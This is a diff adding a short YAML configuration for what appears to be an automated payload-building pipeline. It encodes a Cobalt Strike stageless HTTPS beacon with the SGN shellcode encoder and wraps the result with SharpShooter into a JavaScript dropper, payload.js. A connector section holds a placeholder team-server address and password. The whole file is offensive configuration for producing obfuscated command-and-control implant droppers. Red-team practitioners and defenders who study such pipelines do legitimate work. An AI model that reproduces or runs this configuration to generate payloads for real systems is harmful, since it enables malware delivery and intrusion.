@@ -1,0 +1,21 @@
+file_dir: /home/user/pdcd/out
+cleanup: True
+workers: 2
+payloads:
+- name: sgn
+  image: sgn
+  cli: -a 64 -o @artifact::/shellcode.bin @cobaltstrike::STAGELESS-64-HTTPS
+  store: shellcode
+- name: sharpshooter
+  image: sharpshooter
+  cli: --dotnetver 2 --stageless --payload js --rawscfile @files::shellcode --output payload
+  artifacts:
+  - output/payload.js
+connectors:
+  cobaltstrike:
+    type: cobaltstrike
+    args:
+      password: password
+      host: 1.2.3.4
+      port: "50050"
+      install_dir: /opt/cobaltstrike
